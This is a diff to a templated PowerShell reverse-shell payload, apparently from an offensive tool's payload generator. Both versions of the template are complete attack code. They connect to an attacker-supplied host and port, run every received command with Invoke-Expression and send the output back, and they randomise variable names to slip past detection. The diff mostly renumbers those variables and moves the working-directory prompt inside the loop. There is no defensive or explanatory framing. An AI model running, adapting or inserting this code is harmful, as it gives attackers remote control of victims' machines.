@@ -1,33 +1,33 @@
 {% set variables = strings_random(10, 10) %}
 
-${{ variables[0] }} = "[38;5;196m>-[0m [38;5;250m${PWD}[0m"
-${{ variables[1] }} = "[38;5;196m->[0m"
-${{ variables[2] }} = New-Object System.Net.Sockets.TCPClient(
+${{ variables[0] }} = "[38;5;196m->[0m"
+${{ variables[1] }} = New-Object System.Net.Sockets.TCPClient(
     "{{ lhost }}", {{ lport }})
-${{ variables[3] }} = ${{ variables[2] }}.GetStream()
-[byte[]] ${{ variables[4] }} = 0..65535 | ForEach-Object { 0 }
+${{ variables[2] }} = ${{ variables[1] }}.GetStream()
+[byte[]] ${{ variables[3] }} = 0..65535 | ForEach-Object { 0 }
 
-${{ variables[3] }}.Write(
+${{ variables[2] }}.Write(
     ([text.encoding]::ASCII).GetBytes((
-        "{0} {1} " -f ${{ variables[0] }}, ${{ variables[1] }})))
-${{ variables[3] }}.Flush()
+        "{0} {1} " -f ${{ variables[0] }}, ${{ variables[0] }})))
+${{ variables[2] }}.Flush()
 
-while ((${{ variables[5] }} = ${{ variables[3] }}.Read(
-        ${{ variables[4] }}, 0, ${{ variables[4] }}.Length)) -ne 0) {
-    ${{ variables[6] }} = (New-Object -TypeName System.Text.ASCIIEncoding).
-        GetString(${{ variables[4] }}, 0, ${{ variables[5] }})
-    & { Invoke-Expression ${{ variables[6] }} } 2>&1 |
-        Tee-Object -Variable {{ variables[7] }} | Out-Null
+while ((${{ variables[4] }} = ${{ variables[2] }}.Read(
+        ${{ variables[3] }}, 0, ${{ variables[3] }}.Length)) -ne 0) {
+    ${{ variables[5] }} = (New-Object -TypeName System.Text.ASCIIEncoding).
+        GetString(${{ variables[3] }}, 0, ${{ variables[4] }})
+    & { Invoke-Expression ${{ variables[5] }} } 2>&1 |
+        Tee-Object -Variable {{ variables[6] }} | Out-Null
+    ${{ variables[7] }} = "[38;5;196m>-[0m [38;5;250m${PWD}[0m"
     ${{ variables[8] }} = "{0}`n{1} {2} " -f
-        (${{ variables[7] }} | Out-String),
-        ${{ variables[0] }},
-        ${{ variables[1] }}
+        (${{ variables[6] }} | Out-String),
+        ${{ variables[7] }},
+        ${{ variables[0] }}
     ${{ variables[9] }} = ([text.encoding]::ASCII).
         GetBytes(${{ variables[8] }})
-    ${{ variables[3] }}.
+    ${{ variables[2] }}.
         Write(${{ variables[9] }}, 0, ${{ variables[9] }}.Length)
-    ${{ variables[3] }}.Flush()
+    ${{ variables[2] }}.Flush()
 };
 
-${{ variables[2] }}.Close()
+${{ variables[1] }}.Close()
 
